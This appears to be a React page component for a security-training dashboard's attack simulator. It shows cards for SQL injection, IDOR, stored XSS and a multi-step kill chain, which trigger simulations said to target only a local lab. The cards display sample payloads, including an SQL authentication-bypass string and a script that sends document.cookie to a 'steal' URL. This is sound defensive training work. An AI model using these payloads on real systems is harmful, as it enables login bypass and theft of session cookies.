import React, { useState } from "react";
import { 
  Flame, 
  Database, 
  UserCheck, 
  Code, 
  Workflow, 
  Play, 
  CheckCircle2, 
  AlertTriangle, 
  ShieldAlert, 
  Clock,
  Bot,
  ArrowRight
} from "lucide-react";
import { runSimulation } from "../services/api";

export default function AttackSimulatorPage({ setActiveTab, onLaunchAiWithIncident }) {
  const [runningType, setRunningType] = useState(null);
  const [lastResult, setLastResult] = useState(null);
  const [error, setError] = useState(null);

  const handleSimulate = async (type) => {
    setRunningType(type);
    setError(null);
    setLastResult(null);

    try {
      const res = await runSimulation(type);
      setLastResult(res);
    } catch (err) {
      console.error("Simulation failed:", err);
      setError(err.message || "Failed to execute simulation");
    } finally {
      setRunningType(null);
    }
  };

  const scenarios = [
    {
      id: "sqli",
      title: "SQL Injection (Authentication Bypass)",
      badge: "CRITICAL",
      badgeColor: "bg-red-500/20 text-red-400 border-red-500/40 glow-critical",
      icon: Database,
      endpoint: "POST /vulnerable/login",
      payload: "admin' OR '1'='1' --",
      description: "Injects tautology & comment payload to bypass authentication, triggering CRITICAL security telemetry and automatic source quarantine."
    },
    {
      id: "idor",
      title: "IDOR (Unauthorized Cross-Tenant Profile Access)",
      badge: "HIGH",
      badgeColor: "bg-orange-500/20 text-orange-400 border-orange-500/40",
      icon: UserCheck,
      endpoint: "GET /vulnerable/profile/<id>",
      payload: "User 101 requests Profile 102 (Bob CFO) & 103 (CISO)",
      description: "Sequentially harvests confidential financial and security director dossiers across tenant boundaries without authorization."
    },
    {
      id: "xss",
      title: "Stored XSS (Script Injection into Comments)",
      badge: "HIGH",
      badgeColor: "bg-purple-500/20 text-purple-400 border-purple-500/40",
      icon: Code,
      endpoint: "POST /vulnerable/comments",
      payload: "<script>fetch('...steal?cookie=' + document.cookie);</script>",
      description: "Submits unescaped executable script payload into persistent comment database, activating Stored XSS detection rules."
    },
    {
      id: "multistep",
      title: "Full Kill-Chain Multi-Step Attack",
      badge: "CAMPAIGN",
      badgeColor: "bg-blue-500/20 text-blue-400 border-blue-500/40",
      icon: Workflow,
      endpoint: "Multi-Endpoint Chain",
      payload: "Recon → SQLi Bypass → IDOR Exfiltration → Containment",
      description: "Executes end-to-end cyber incident lifecycle in sequence. Correlates disparate vectors into Incident #INC-001 and enforces 403 block."
    }
  ];

  return (
    <div className="space-y-6 pb-12">
      {/* Header */}
      <div className="cyber-panel p-4 rounded-xl border border-soc-border flex flex-col sm:flex-row sm:items-center justify-between gap-3">
        <div>
          <div className="flex items-center gap-2">
            <Flame className="w-5 h-5 text-red-500" />
            <h1 className="text-lg font-black text-white tracking-wide font-sans">
              RED TEAM ATTACK SIMULATOR & SCENARIO CONSOLE
            </h1>
          </div>
          <p className="text-xs text-slate-400 font-mono mt-0.5">
            Controlled local synthetic event generator safely exercising detection, correlation, and automated quarantine.
          </p>
        </div>

        {/* Demo Mode Button */}
        <button
          onClick={() => handleSimulate("demo")}
          disabled={runningType === "demo"}
          className="px-4 py-2 rounded-lg bg-gradient-to-r from-blue-600 via-indigo-600 to-purple-600 hover:from-blue-500 hover:to-purple-500 text-white text-xs font-bold shadow-lg shadow-blue-600/30 flex items-center gap-2 transition active:scale-95 disabled:opacity-50 font-mono"
        >
          <Play className={`w-4 h-4 fill-current ${runningType === "demo" ? "animate-spin" : ""}`} />
          <span>START DEMO MODE (JUDGING)</span>
        </button>
      </div>

      {/* Safety Notice */}
      <div className="p-3.5 rounded-xl bg-slate-900/90 border border-slate-800 text-xs font-mono text-slate-400 flex items-center gap-3">
        <div className="p-2 rounded bg-blue-500/10 text-cyan-400 border border-blue-500/20 shrink-0">
          <ShieldAlert className="w-4 h-4" />
        </div>
        <div>
          <strong className="text-slate-200">TRAINING ISOLATION GUARANTEE:</strong> All simulated requests target only the local training lab (127.0.0.1). No external hosts, networks, or OS firewall settings are modified.
        </div>
      </div>

      {/* Last Execution Feedback Banner */}
      {lastResult && (
        <div className="p-4 rounded-xl bg-emerald-950/40 border border-emerald-500/40 text-xs font-mono text-emerald-300 space-y-2 animate-fadeIn">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2 font-bold text-sm">
              <CheckCircle2 className="w-4 h-4 text-emerald-400" />
              <span>Scenario Completed Successfully! Telemetry stream dispatched to SOC HUD.</span>
            </div>
            <span className="text-[11px] px-2 py-0.5 rounded bg-emerald-500/20 text-emerald-300 font-bold">
              STATUS: DISPATCHED
            </span>
          </div>

          <div className="text-slate-300 text-[11px]">
            Scenario: <span className="text-white font-bold">{lastResult.scenario || "DEMO"}</span> • Events Generated: {lastResult.events_generated || lastResult.events_count || 1}
          </div>

          <div className="flex items-center gap-4 pt-2">
            <button
              onClick={() => setActiveTab("command_center")}
              className="text-xs text-cyan-400 hover:text-cyan-300 font-semibold flex items-center gap-1"
            >
              <span>Inspect Command Center HUD</span>
              <ArrowRight className="w-3 h-3" />
            </button>

            <button
              onClick={() => setActiveTab("ai_analyst")}
              className="text-xs text-purple-400 hover:text-purple-300 font-semibold flex items-center gap-1"
            >
              <Bot className="w-3.5 h-3.5" />
              <span>Triage with AI Analyst</span>
              <ArrowRight className="w-3 h-3" />
            </button>
          </div>
        </div>
      )}

      {error && (
        <div className="p-4 rounded-xl bg-red-950/40 border border-red-500/50 text-xs font-mono text-red-300 flex items-center gap-2">
          <AlertTriangle className="w-4 h-4 text-red-400 shrink-0" />
          <span>Simulation Error: {error}</span>
        </div>
      )}

      {/* 4 Core Scenario Cards */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        {scenarios.map((sc) => {
          const Icon = sc.icon;
          const isRunning = runningType === sc.id;

          return (
            <div
              key={sc.id}
              className="p-5 rounded-xl bg-soc-card border border-soc-border hover:border-slate-700 transition flex flex-col justify-between shadow-sm space-y-4"
            >
              <div className="space-y-3">
                <div className="flex items-start justify-between gap-2">
                  <div className="flex items-center gap-2.5">
                    <div className="p-2 rounded-lg bg-slate-800 border border-slate-700 text-cyan-400">
                      <Icon className="w-5 h-5" />
                    </div>
                    <div>
                      <h3 className="text-sm font-bold text-white font-sans">{sc.title}</h3>
                      <span className="text-[11px] font-mono text-slate-400">{sc.endpoint}</span>
                    </div>
                  </div>

                  <span className={`px-2 py-0.5 rounded text-[10px] font-mono font-bold border ${sc.badgeColor}`}>
                    {sc.badge}
                  </span>
                </div>

                <p className="text-xs text-slate-300 leading-relaxed font-sans">
                  {sc.description}
                </p>

                <div className="p-2.5 rounded-lg bg-black/80 border border-slate-800 font-mono text-[11px] text-yellow-400">
                  <span className="text-slate-500 select-none">$ Injected Payload: </span>
                  {sc.payload}
                </div>
              </div>

              <div className="pt-3 border-t border-soc-border flex items-center justify-between">
                <span className="text-[11px] text-slate-500 font-mono">Real Pipeline Trigger</span>

                <button
                  onClick={() => handleSimulate(sc.id)}
                  disabled={isRunning || runningType !== null}
                  className="px-3.5 py-1.5 rounded-lg bg-blue-600 hover:bg-blue-500 text-white font-semibold text-xs transition active:scale-95 disabled:opacity-50 flex items-center gap-1.5 shadow font-mono"
                >
                  <Play className={`w-3.5 h-3.5 fill-current ${isRunning ? "animate-spin" : ""}`} />
                  <span>{isRunning ? "Simulating..." : `Simulate ${sc.title.split(" ")[0]}`}</span>
                </button>
              </div>
            </div>
          );
        })}
      </div>
    </div>
  );
}
